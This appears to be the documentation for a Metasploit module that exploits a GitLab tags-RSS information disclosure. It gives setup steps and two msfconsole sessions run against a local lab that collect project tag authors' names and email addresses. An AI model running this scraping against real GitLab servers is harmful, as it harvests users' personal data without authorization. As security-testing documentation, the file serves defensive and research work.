## Vulnerable Application

Information disclosure affecting all versions of GitLab
before 16.6.6, 16.7 prior to 16.7.4, and 16.8 prior to 16.8.1
by sending a GET request to the project URI and appending "-/tags"

### Docker installation instructions can be found here:

https://docs.gitlab.com/ee/install/docker.html

Once installed, create a project. Once the project is
created, add a new tag by expanding the Code menu item
on the left, then selecting Tags. Then click on the 
New Tag button in the top right corner.

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use [module path]`
1. Do: `set RHOSTS [IP]`
1. Do: `run`
1. You should receive output with user names and email addresses assocaited with project tags

## Options

### TARGETPROJECT

This will gather information for ALL PUBLICLY ACCESSIBLE PROJECTS. IF you know the specific project you would
like to target, you would need to set that here.

## Scenarios
### Scrape all Workspaces/Projects
```
msf6 > use auxiliary/gather/gitlab_tags_rss_info_disclosure 
msf6 auxiliary(gather/gitlab_tags_rss_info_disclosure) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 auxiliary(gather/gitlab_tags_rss_info_disclosure) > run
[*] Running module against 127.0.0.1

[+] [2024.02.09-11:18:23] Scraping ALL projects...
[*] [2024.02.09-11:18:23] Check RSS tags feed for: Workspace1/Project1
[+] [2024.02.09-11:18:23] Output saved to /root/.msf4/loot/20240209111823_default_127.0.0.1_gitlab.RSS.info__010524.xml
[+] [2024.02.09-11:18:23] name: john doe
[+] [2024.02.09-11:18:23] e-mail: johndoe@example.com
[*] [2024.02.09-11:18:23] Check RSS tags feed for: Workspace1/Project2
[+] [2024.02.09-11:18:23] Output saved to /root/.msf4/loot/20240209111823_default_127.0.0.1_gitlab.RSS.info__822263.xml
[+] [2024.02.09-11:18:23] name: janedoe
[+] [2024.02.09-11:18:23] e-mail: janedoe@example.com
[*] [2024.02.09-11:18:23] Check RSS tags feed for: ws2/proj1
[-] [2024.02.09-11:18:23] No tags or authors found
[*] [2024.02.09-11:18:23] Check RSS tags feed for: ws3/proj1
[-] [2024.02.09-11:18:23] No tags or authors found
[*] [2024.02.09-11:18:23] Check RSS tags feed for: ws3/proj2
[-] [2024.02.09-11:18:23] No tags or authors found
[*] Auxiliary module execution completed
```
### Specify Project
```
msf6 > use auxiliary/gather/gitlab_tags_rss_info_disclosure 
msf6 auxiliary(gather/gitlab_tags_rss_info_disclosure) > set RHOSTS 127.0.0.1     
msf6 auxiliary(gather/gitlab_tags_rss_info_disclosure) > set TARGETPROJECT Workspace1/Project1
TARGETPROJECT => Workspace1/Project1
msf6 auxiliary(gather/gitlab_tags_rss_info_disclosure) > run
[*] Running module against 127.0.0.1

[*] [2024.02.09-11:44:43] Check RSS tags feed for: Workspace1/Project1
[+] [2024.02.09-11:44:43] Output saved to /root/.msf4/loot/20240209114443_default_127.0.0.1_gitlab.RSS.info__390983.xml
[+] [2024.02.09-11:44:43] name: janedoe
[+] [2024.02.09-11:44:43] e-mail: janedoe@example.com
[*] Auxiliary module execution completed
```
